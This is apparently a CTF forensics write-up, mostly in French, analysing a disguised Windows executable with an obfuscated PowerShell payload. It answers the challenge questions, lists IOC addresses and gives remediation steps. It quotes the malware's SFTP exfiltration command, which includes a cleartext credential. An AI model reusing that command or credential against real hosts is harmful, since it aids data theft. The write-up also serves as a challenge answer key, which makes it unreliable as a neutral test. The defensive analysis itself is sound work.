---
tags:
  - writeup/htb
  - ctf
  - forensics
  - malware-analysis
  - windows
  - powershell
  - exfiltration
---

# Heartbreaker-Continuum
Après download et decompression de l’archive on observe un binaire nommé Superstar_MemberCard.tiff.exe.

Son hash sha 256 est 12daa34111bb54b3dcbad42305663e44e7e6c3842f015cccbbe6564d9dfd3ea3 

réponse à la question1

Avec exiftool on retrouve le timestamp ce qui ramené en temps UTC est 2024-03-13 10:38:06 

réponse à la question 2

![Capture d'écran 2024-10-04 222045.png](Capture_dcran_2024-10-04_222045.png)

Avec readpe on arrive à trouver la taille du code du binaire

![Screenshot_2024-10-04_23-39-52.png](Screenshot_2024-10-04_23-39-52.png)

38400

réponse 3

On fait un string et on a le script powershell

![Screenshot_2024-10-05_00-05-33.png](Screenshot_2024-10-05_00-05-33.png)

newILY.ps1

réponse 4

![Screenshot_2024-10-05_00-13-32.png](Screenshot_2024-10-05_00-13-32.png)

A 2c60 on est a 20 octets du début du code obfusqué l’offset est donc 2c74

réponse 5

Le == en début de code fait immédiatement penser à du base64

réponse 6

Après avoir reverse l’ordre du code obfusqué on peu le décode avec echo | base64 -d ou cyberchef

On voit tout de suite le cmdlet Invoke-WebRequest

réponse 7

![image.png](Hacking/Images/Heartbreaker-Continuum/image.png)

Concernant les indicateurs de compromission on note d’emblée une adresse ip 44.206.187.144 pour download le malware puis une autre utilisée par sftp pour exfiltrer des données35.169.66.138

réponse 8

On note également $targetDir = "C:\Users\Public\Public Files” réponse à la question 9

Pour la question 11 il faut explorer le MITTRE ATTACK en tapant gather data on arrive à l’item collection en affinant la recherche 

| [T1119](https://attack.mitre.org/techniques/T1119) |  | [Automated Collection](https://attack.mitre.org/techniques/T1119) | Once established within a system or 
network, an adversary may use automated techniques for collecting 
internal data. Methods for performing this technique could include use 
of a [Command and Scripting Interpreter](https://attack.mitre.org/techniques/T1059) to search for and copy information fitting set criteria such as file type, location, or name at specific time intervals. |
| --- | --- | --- | --- |

réponse 10

Pour la dernière question on a vu passer 

`open sftp://service:M8&C!i6KkmGL1-#@35.169.66.138/ -hostkey=*`

Le mdp est en clair dans la requête sftp

## Attack Summary

The investigation started with a suspicious executable file (`Superstar_MemberCard.tiff.exe`), which turned out to be a disguised binary.

Static analysis revealed:

- embedded PowerShell script (`newILY.ps1`)
- obfuscated payload encoded in Base64
- use of `Invoke-WebRequest` for external communication

After decoding the payload, the attacker workflow was identified:

- download of additional malicious content from `44.206.187.144`
- data collection from the host
- exfiltration via SFTP to `35.169.66.138`

The attack chain follows:

> **malicious file → execution → PowerShell payload → download → collection → exfiltration**

---

## Timeline

- **2024-03-13 10:38:06 UTC**  
    File timestamp identified via metadata (`exiftool`)
- **Initial analysis**
    - Detection of PE binary disguised as `.tiff.exe`
    - Code size identified (`readpe`)
- **Static analysis phase**
    - Extraction of strings → discovery of:
        - `newILY.ps1`
    - Identification of obfuscated payload (Base64)
- **Decoding phase**
    - Reversed and decoded payload
    - Discovery of:
        - `Invoke-WebRequest`
- **Post-exploitation behavior**
    - Download from:
        - `44.206.187.144`
    - Data staging in:
        - `C:\Users\Public\Public Files`
- **Exfiltration phase**
    - SFTP connection to:
        - `35.169.66.138`
    - Credentials exposed in clear text:
        - `service:M8&C!i6KkmGL1-#`

---

## Threat Context

The attacker used a **malware-based intrusion with obfuscated PowerShell payloads**, a common technique in modern attacks.

Observed techniques:

- Masquerading (file disguised as image)
- PowerShell execution (`T1059`)
- Obfuscation (Base64 encoding)
- Remote payload download
- Automated data collection (`T1119`)
- Data exfiltration via SFTP

This behavior is consistent with:

> **commodity malware or low-to-mid sophistication threat actors**

The use of:

- PowerShell
- encoded payloads
- public infrastructure (IP addresses)

suggests:

> **automated or semi-automated attack campaigns**

Objective:

> **data collection and exfiltration**

---

## Remediation 

### Immediate containment

- Isolate infected host from the network
- Block malicious IPs:
    - `44.206.187.144`
    - `35.169.66.138`

---

### Eradication

- Remove malicious file:
    - `Superstar_MemberCard.tiff.exe`
- Delete dropped scripts:
    - `newILY.ps1`
- Remove any persistence mechanisms (scheduled tasks, registry keys)

---

### Credential security

- Invalidate exposed credentials:
    - `service` account
- Rotate all potentially compromised credentials
- Audit accounts for unauthorized access

---

### System recovery

- Scan system for additional malware
- Verify integrity of critical files
- Rebuild system if compromise scope is unknown

---

### Monitoring & detection

- Monitor:
    - PowerShell execution (especially encoded commands)
    - outbound connections to unknown IPs
- Alert on:
    - Base64 encoded PowerShell
    - suspicious file execution from user directories

---

### Long-term prevention

- Restrict PowerShell execution (Constrained Language Mode / logging)
- Enable advanced logging (Sysmon, PowerShell logs)
- Use EDR to detect obfuscation and exfiltration patterns
- Block execution of files with double extensions (`.tiff.exe`)
- Apply least privilege principle